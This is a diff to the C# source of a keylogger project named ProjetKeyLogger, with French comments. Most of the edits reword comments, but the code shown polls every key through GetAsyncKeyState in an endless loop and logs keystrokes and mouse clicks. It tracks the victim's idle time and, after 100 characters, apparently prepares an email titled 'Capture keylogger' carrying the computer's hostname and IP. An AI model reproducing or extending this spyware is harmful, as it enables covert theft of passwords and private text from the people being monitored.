@@ -31,7 +31,7 @@ namespace ProjetKeyLogger
             //initialisation du nombre de caractere
             nb_caractere_tape = 0;
             
-            //Le temps est initialisé (En miliseconde)
+            //Le temps d'attente est initialisé (En miliseconde)
             sleep_time = 3;
 
             //on initialise le temps d'inactivité maximum (En minute)
@@ -45,8 +45,7 @@ namespace ProjetKeyLogger
         }
 
         //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
-        //Cette fonction vient d'une librairie stockée dans user32.dll 
-        // l'argument est une "virtual key code " car chaque action est asscoiée à une clé
+        //L'argument est une "virtual key code " car chaque action est asscoiée à une clé
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(int cle);
                 
@@ -65,9 +64,9 @@ namespace ProjetKeyLogger
             //Initialisation du moment de la derniere activité de l'ordinateur de la victime
             DateTime date_dernier_activite = DateTime.Now;
 
-            while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
+            //Boucle "infinie"
+            while (true) 
             {
-
                 //On test si la touche shift est enfoncée
                 shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                 //On test si la Majuscule est activé
@@ -80,24 +79,28 @@ namespace ProjetKeyLogger
                 // CTRL + ALT
                 altgr = (Control.ModifierKeys & Keys.Alt) == Keys.Alt && (Control.ModifierKeys & Keys.Control) == Keys.Control;
 
-                //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
-                Thread.Sleep(sleep_time); //nombre en miliseconde
+                //On fait dormir le programme un certaint temps car nous sommes dans une boucle infinie
+                Thread.Sleep(sleep_time);
 
-                //verification de l'état de chaque touche (up ou down)
+                //Verification de l'état de chaque touche
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
+                    //Statut de la clé touche correspondant au codeASCII
                     int statut_cle = GetAsyncKeyState(codeASCII);
-                    //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
-                    //Si la touche alt est activée seule
+
+                    //Le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
                         //le temps d'innactivité est reinitialisé
                         date_dernier_activite = DateTime.Now;
 
+                        //Chaine de caractère servant de pivot pour le traitement de certaines touches
                         string valeurs;
+
+                        //Test sur le codeASCII pour lequel la condition est activée
                         switch (codeASCII)
                         {
-                            //Si touche Entrée
+                            //Si touche Entrée ou cli souris
                             case 1:
                             case 2:
                             case 13:
@@ -342,11 +345,12 @@ namespace ProjetKeyLogger
                             default:
                                 break;
                         }
+                        //On incrémente le nombre de caractère tapé
                         nb_caractere_tape += 1;
 
                     }
 
-                    //SI le nombre de caracteres tapés a dépassé la limite
+                    //Si le nombre de caracteres tapés a dépassé la limite
                     //Et si le temps d'innactivité a dépassé 5 minutes
                     if (nb_caractere_tape > 100 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
                     {
@@ -387,6 +391,7 @@ namespace ProjetKeyLogger
 
             //l'object du mail
             string objet_mail = "Capture keylogger";
+
             //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
             var nom_ordinateur = Dns.GetHostEntry(Dns.GetHostName());
 
